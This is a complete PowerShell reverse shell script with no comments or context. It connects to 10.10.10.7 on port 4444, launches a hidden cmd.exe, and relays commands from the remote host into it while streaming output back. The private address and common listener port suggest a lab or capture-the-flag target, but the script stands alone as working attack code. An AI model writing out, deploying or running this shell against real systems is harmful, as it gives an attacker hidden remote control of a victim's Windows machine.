$host_ip="10.10.10.7";
$host_port=4444;
$client = New-Object System.Net.Sockets.TCPClient($host_ip,$host_port);
$stream = $client.GetStream();
$writer = New-Object System.IO.StreamWriter($stream); 
$writer.AutoFlush = $true;

$psi = New-Object System.Diagnostics.ProcessStartInfo;
$psi.FileName = "cmd.exe";
$psi.Arguments = "/Q";
$psi.UseShellExecute = $false;
$psi.RedirectStandardInput = $true;
$psi.RedirectStandardOutput = $true;
$psi.RedirectStandardError = $true;
$psi.CreateNoWindow = $true;
$proc = New-Object System.Diagnostics.Process;
$proc.StartInfo = $psi;

$proc.Start() | Out-Null;
$proc.BeginOutputReadLine();
$proc.BeginErrorReadLine();
$command="";
$outputAction = {
    if ($Event.SourceEventArgs.Data) {
        $line = $Event.SourceEventArgs.Data;
        $writer.WriteLine($line);
        $writer.Flush(); 
    }
};

$errorAction = {
    if ($Event.SourceEventArgs.Data) {
        $writer.WriteLine($Event.SourceEventArgs.Data);
        $writer.Flush();
    }
};

$outputEvent = Register-ObjectEvent -InputObject $proc -EventName OutputDataReceived -Action $outputAction;
$errorEvent = Register-ObjectEvent -InputObject $proc -EventName ErrorDataReceived -Action $errorAction;

$inputBuffer = "";
$readBuffer = New-Object byte[] 65535;

try {
    $proc.StandardInput.WriteLine("prompt `$_");
    $proc.StandardInput.Flush();
    Start-Sleep -Milliseconds 100;
        
    while ($client.Connected -and !$proc.HasExited) {
        if ($stream.DataAvailable) {
            $bytesRead = $stream.Read($readBuffer, 0, $readBuffer.Length);
            if ($bytesRead -gt 0) {
                $data = [System.Text.Encoding]::ASCII.GetString($readBuffer, 0, $bytesRead);
                $inputBuffer += $data;
                
                while ($inputBuffer.Contains("`n")) {
                    $newlineIndex = $inputBuffer.IndexOf("`n");
                    $command = $inputBuffer.Substring(0, $newlineIndex).Trim("`r");
                    $inputBuffer = $inputBuffer.Substring($newlineIndex + 1);
                                        
                    if ($command.Trim() -ne "") {
                        $proc.StandardInput.WriteLine($command);
                        $proc.StandardInput.Flush();
                    }
                }
            }
        }
        Start-Sleep -Milliseconds 10;
    }
}
finally {
    if ($outputEvent) { Unregister-Event -SourceIdentifier $outputEvent.Name; }
    if ($errorEvent) { Unregister-Event -SourceIdentifier $errorEvent.Name; }
    
    if (!$proc.HasExited) { 
        $proc.StandardInput.Close();
        $proc.Kill();
    }
    $client.Close();
}